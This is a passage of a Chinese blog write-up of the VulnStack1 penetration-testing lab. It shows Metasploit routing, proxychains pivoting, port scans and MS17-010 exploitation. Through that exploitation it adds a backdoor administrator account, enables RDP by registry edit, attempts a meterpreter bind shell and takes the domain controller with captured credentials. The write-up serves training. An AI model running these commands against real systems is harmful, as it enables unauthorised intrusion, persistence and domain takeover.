+<p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p>
+<blockquote>
+<p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。</p>
+</blockquote>
+<p>自动创建路由：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">meterpreter &gt; run post<span class="hljs-regexp">/multi/m</span>anage/autoroute<br></code></pre></td></tr></table></figure>
+
+<p>查看路由：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211542023.png" srcset="/img/loading.gif" lazyload alt="image-20230921154256965"></p>
+<p>添加完成路由之后我们就可以使用<code>msf</code>去探测、攻击<code>192.168.52.0/24</code>网段的机器了</p>
+<p>但是这仅仅局限与msf中，如果我们想要在外网也能访问，我们需要加一个socks代理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 首先background退回上层</span><br>msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>msf6 auxiliary(server/socks_proxy) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211548712.png" srcset="/img/loading.gif" lazyload alt="image-20230921154818657"></p>
+<p>这样就会在1080端口弄一个socks5代理，接下来只需要在<code>proxychains</code>配置文件修改一下就行：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211549975.png" srcset="/img/loading.gif" lazyload alt="image-20230921154937938"></p>
+<p>测试一下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">proxychains4 curl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">52.88</span>/<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211559564.png" srcset="/img/loading.gif" lazyload alt="image-20230921155919484"></p>
+<p>发现代理成功了</p>
+<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><h5 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h5><p>我们加上代理使用nmap测一下<code>win2003</code>的主机开放端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -p <span class="hljs-number">0</span>-<span class="hljs-number">1000</span> -Pn -sT <span class="hljs-number">192.168.52.141</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211601226.png" srcset="/img/loading.gif" lazyload alt="image-20230921160145133" style="zoom:50%;" />
+
+<h5 id="msf端口扫描"><a href="#msf端口扫描" class="headerlink" title="msf端口扫描"></a>msf端口扫描</h5><p>（这里想要扫描到内网需要配置一个路由）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">msf6</span> &gt; set rhosts <span class="hljs-number">192.168.52.141</span><br><span class="hljs-attribute">msf6</span> &gt; set ports <span class="hljs-number">80</span>,<span class="hljs-number">135</span>-<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span><br><span class="hljs-attribute">msf6</span> &gt; run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211604521.png" srcset="/img/loading.gif" lazyload alt="image-20230921160426438"></p>
+<p>扫一下<code>192.168.52.138</code>:</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211606636.png" srcset="/img/loading.gif" lazyload alt="image-20230921160604590"></p>
+<p>这两台都开了445端口</p>
+<h4 id="永恒之蓝检测及利用"><a href="#永恒之蓝检测及利用" class="headerlink" title="永恒之蓝检测及利用"></a>永恒之蓝检测及利用</h4><p>我们可以先使用<code>use auxiliary/scanner/smb/smb_version</code>扫描一下系统的版本：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211609874.png" srcset="/img/loading.gif" lazyload alt="image-20230921160954795"></p>
+<p>可以看到是<code>win2003</code></p>
+<p>打之前先探测一波：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">search</span> ms17-010<br><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhost 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211617322.png" srcset="/img/loading.gif" lazyload alt="image-20230921161705228"></p>
+<p>存在永恒之蓝</p>
+<p>三台机器都存在ms17-010</p>
+<p>先看server2003这台主机</p>
+<p>直接使用ms17-010打一个shell回来（这里要注意一下，msf内置的17-010打2003有时候多次执行后msf就接收不到session，而且ms17-010利用时，脆弱的server 2003非常容易蓝屏）</p>
+<p>而且<strong>使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell</strong>。因为此处域中两台机器不出网</p>
+<p>我们搜索一下msf有哪些能够利用的模块</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211644806.png" srcset="/img/loading.gif" lazyload alt="image-20230921164413732"></p>
+<p>此处我们选择一下<code>auxiliary/admin/smb/ms17_010_command</code>，可以用来执行命令</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">use auxiliary/admin/smb/ms17_010_<span class="hljs-keyword">command</span><br>show options<br><span class="hljs-keyword">set</span> RHOSTS 192.168.52.141<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user leekos L372488621. <span class="hljs-string">/add</span> <span class="hljs-comment">#添加用户</span><br>run <span class="hljs-comment">#成功执行</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators leekos <span class="hljs-string">/add</span> <span class="hljs-comment">#管理员权限</span><br>run <span class="hljs-comment">#成功执行</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27;  <span class="hljs-comment"># 开启3389端口</span><br>run <span class="hljs-comment">#成功执行</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们连接：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211710172.png" srcset="/img/loading.gif" lazyload alt="image-20230921171049109"></p>
+<p>登上去了</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211711309.png" srcset="/img/loading.gif" lazyload alt="image-20230921171154237"></p>
+<p>我们想利用<code>exploit/windows/smb/ms17_010_psexec</code>模块弄一个msf shell</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.52.141</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p>但是成功不了</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211734766.png" srcset="/img/loading.gif" lazyload alt="image-20230921173442689"></p>
+<p>根据：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html%EF%BC%8C%E8%AF%A5%E6%A8%A1%E5%9D%97%E6%98%AF%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E4%BA%86%E7%9A%84">https://www.cnblogs.com/yokan/p/14021537.html，该模块是利用成功了的</a></p>
+<p>直接<code>getsystem</code>就提升到了<code>system</code>权限</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211736371.png" srcset="/img/loading.gif" lazyload alt="image-20230921173616278"></p>
+<h4 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h4><p>在前面我们已经拿到了域用户的帐号密码，即administrator、L372488621. 我们现在要做的就是如何登录到域控上去</p>
+<p>定位到域控制器的ip为192.168.52.138</p>
+<p>因为之前抓到了域管理的账号密码所以直接使用 <code>exploit/windows/smb/psexec</code>模块拿下域控，且是管理员权限</p>
+<p>（这是别人的图）</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211744886.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211744395.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html">https://www.cnblogs.com/yokan/p/14021537.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41821603/article/details/109948920#3hash_337">https://blog.csdn.net/qq_41821603/article/details/109948920#3hash_337</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E3%80%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E3%80%91%E7%BA%A2%E6%97%A5VulnStack1/" class="print-no-link">#【内网渗透】红日VulnStack1</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【内网渗透】红日VulnStack1</div>
+      <div>https://leekosss.github.io/2023/09/17/[内网渗透]vulnStack1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月17日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年9月21日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/17/%5Bvulnhub%5DOs-hackNOS1/" title="【vulnhub】Os-hackNOS1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【vulnhub】Os-hackNOS1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/17/%5BBUUCTF%5Dweb(%E7%AC%AC5%E9%A1%B5wp)/" title="【BUUCTF】web(第5页wp)">
+                        <span class="hidden-mobile">【BUUCTF】web(第5页wp)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
